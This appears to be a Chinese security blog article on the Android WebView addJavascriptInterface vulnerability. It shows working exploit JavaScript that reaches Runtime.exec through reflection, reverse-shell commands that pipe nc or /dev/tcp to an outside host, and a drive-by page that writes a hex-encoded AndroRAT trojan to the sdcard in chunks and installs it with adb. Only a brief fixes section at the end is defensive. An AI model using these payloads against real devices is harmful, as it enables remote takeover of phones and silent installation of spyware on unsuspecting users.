# WebView中接口隐患与手机挂马利用

0x00 背景
-------

* * *

在android的sdk中封装了webView控件。这个控件主要用开控制的网页浏览。在程序中装载webView控件，可以设置属性（颜色，字体等）。类似PC下directUI的功能。在webView 下有一个非常特殊的接口函数addJavascriptInterface。能实现本地java和js的交互。利用addJavascriptInterface这个接口函数可实现穿透webkit控制android 本机。

0x01 检测利用
---------

* * *

一般使用html 来设计应用页面的几乎不可避免的使用到addJavascriptInterface，包含不限于android浏览器。

在android 代码程序一般是这样使用：

```
settings.setJavaScriptEnabled(true);
settings.setJavaScriptCanOpenWindowsAutomatically(true);
mWebView.addJavascriptInterface(new JSInvokeClass(), "js2java");

```

这里可以用

```
apk->zip->dex->dex2jar->jdgui->java

```

代码来查找。

但建议用apktool 反编译smali（毕竟不是所有apk都能反编译成java代码）

在smali代码中 则是类似下列的代码：

```
const-string v0, " js2java "
invoke-virtual {p1, v1, v0},Lcom/tiantianmini/android/browser/module/ac;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V

```

当检测到存在上述代码时，可以进行进一步验证利用：

在11年，已经有人利用addJavascriptInterface进行文件读写，并放出简单的poc,到12年出现了简单的执行代码的exp。利用的是反射回调java类的内置静态变量。如下列的利用代码；

```
<script>
function execute(cmdArgs)
{
    return js2java.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
}
…
</script>   

```

利用java的exec执行linux的shell命令。

0x02 远程获取shell
--------------

* * *

套用yuange的一句话：Poc远远小于exp的价值。

利用addJavascriptInterface实现shell.

Android内部的armlinux 是没有busybox 的，一些常规弹shell的方法被限制。

使用了java的反弹shell方法

```
//execute(["/system/bin/sh","-c","exec 5<>/dev/tcp/192.168.1.9/8088;cat <&5 | while read line; do $line 2>&5 >&5; done"]);

```

在Nexus One 4.3的android虚拟机 并未成功弹出shell.

后发现android中可执行 nc命令 （阉割版的不带-e的nc）

这里用了nc的另外一种弹shell的方法完成

Exp 内容：

```
<script>
function execute(cmdArgs)
{
return XXX.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
}
execute(["/system/bin/sh","-c","nc 192.168.1.9 8088|/system/bin/sh|nc 192.168.1.9 9999"]);
alert("ok3");
</script>

```

// 注 xxx 保护隐私用xx代指。

效果如下 ￼![enter image description here](http://drops.javaweb.org/uploads/images/43421823c10981f61790800e6b2439aff621c4f1.jpg)

当然可以用远程IP地址。

0x03 远程挂马
---------

* * *

毕竟是android环境，shell使用不是很方便。类似xsser肯定不满足于此。

再升华下，实现网页挂马。

Android 4.1已经加入ASLR技术,堆喷射之类不再有效。UAF要针对android的内核版本。利用自身特性的漏洞是目前比较靠谱的方法。

这里以androrat远控木马为例。

实现网页挂马

大部分浏览器已经对下载文件进行保存提示。这里需要把andrat.apk写到挂马网页之中。

```
<script>
function execute(cmdArgs)
{
return xxx.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
} 

var armBinary = "x50x4Bx03x04x14x00x08x00x08x00x51x8FxCAx40x00x00x00x00x00x00x00x00x00x00x00x00x13x00x04x00x72x65x73x2Fx6Cx61x79x6Fx75x74x2Fx6Dx61x69x6Ex2Ex78x6Dx6CxFExCAx00x00xADx52x31x6FxD3x40x18xFDx2Ex76xAEx86xC4x69x5Ax3Ax54xA2x12xA9xC4x80x22x61xE3xAAx42x4DxC7x22x86x4Ax91xA8x14xC4x0Ax56x7CxC2x27x68x1Cx39x57x0Ax53x11x3Bx63x37x06xFEx01x33x1Bx43x17x36x56xFEx07xACx6Dx9FxCBx1Dx3Dx
……
var patharm = "/data/app/Androrat.apk";
var a=execute(["/system/bin/sh","-c","echo -n +armBinary+ > " + patharm]);
execute(["chmod"," 755 ","/data/app/Androrat.apk"]);

```

这样存在几个问题：

andrat.apk的 hex value大约300k,浏览器或者java的exec可能对传入参数大小有限制，（测试的浏览器有限制无法执行）

/data/app/ 目录存在权限问题，需要root，chmod 也是同理。

Android这种静默安装要么是有root或者系统签名的install权限，要么是做成预装软件的样子并且重启。或者是2.2 版本左右可以 通过调用隐藏api安装。

经过进行fuzz实验，完成了挂马功能：

```
<script>
function execute(cmdArgs)
{
return xxx.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
} 

var armBinary1 = "x50x4Bx03x04x14x00x08x00x08x00x51x8FxCAx40x00x00x00x00x00x00x00x00x00x00x00x00x13x00x04x00x72x65x73x2Fx6Cx61x79x6Fx75x74x2Fx6Dx61x69x6Ex2Ex78x6Dx6CxFExCAx00x00xADx52x31x6FxD3x40x18xFDx2Ex76xAEx86xC4x69x5Ax3Ax54xA2x12xA9xC4

var armBinary2="x1BxB0x65x0AxADx23xC2x30x64xDFxEExA1x0DxA4xE8x3Fx61x80xEExBCxE1xE7x7Bx4Ax25x6Fx8Bx36x71xC3x80x81x58xDBxC9x8Fx53x9FxEEx8Ax45xAFx23x54x4AxCFx2Bx52xF2x33x84xBAx82x36xC4x0Dx08xAFxC2x61x8ExD8x7Bx0BxFCx88x4Ax25x24x8Cx22xFAx76x44x78x5Ex99x62x30x44x8DxDBx74x94

var armBinary3=…
var armBinary4=…
……
var patharm = "/mnt/sdcard/Androrat.apk";
var a=execute(["/system/bin/sh","-c","echo -n +armBinary1+ > " + patharm]);
//alert(a);
execute(["/system/bin/sh","-c","echo -n +armBinary2+ >> " + patharm]);
execute(["/system/bin/sh","-c","echo  -n +armBinary3+ >> " + patharm]);
execute(["/system/bin/sh","-c","echo -n +armBinary4+ >> " + patharm]);
execute(["/system/bin/sh","-c","adb install /mnt/sdcard/Androrat.apk"]);
alert("over !!!");
</script>

```

将androrat.apk拆分。

利用echo写入到sdcard中（此目录可读可写 不可执行）。

利用自身带的adb进行安装（安装各种xx手机助手的不在少数吧）。 ￼![enter image description here](http://drops.javaweb.org/uploads/images/f5f8fdbe47c7140f4c379735315cfccef0dc2f71.jpg)

Androrat 成功安装，这里使用了androrat的debug=true模式。

![enter image description here](http://drops.javaweb.org/uploads/images/f10571991f53b1609dbdfe976406534c672c6ea6.jpg)

成功连接到控制端。

0x04 修复
-------

* * *

1、Android 4.2 （api17）已经开始采用新的接口函数【java中应该叫方法：） 】，@JavascriptInterface 代替addjavascriptInterface, 有些android 2.3不再升级，浏览器需要兼容。

2、在使用js2java的bridge时候，需要对每个传入的参数进行验证，屏蔽攻击代码。

3、控制相关权限或者尽可能不要使用js2java的bridge。

Link:[http://developer.android.com/reference/android/webkit/WebView.html](http://developer.android.com/reference/android/webkit/WebView.html)[http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)](http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface%28java.lang.Object,%20java.lang.String%29)[http://www.cis.syr.edu/~wedu/Research/paper/webview_acsac2011.pdf](http://www.cis.syr.edu/~wedu/Research/paper/webview_acsac2011.pdf)[http://50.56.33.56/blog/?p=314](http://50.56.33.56/blog/?p=314)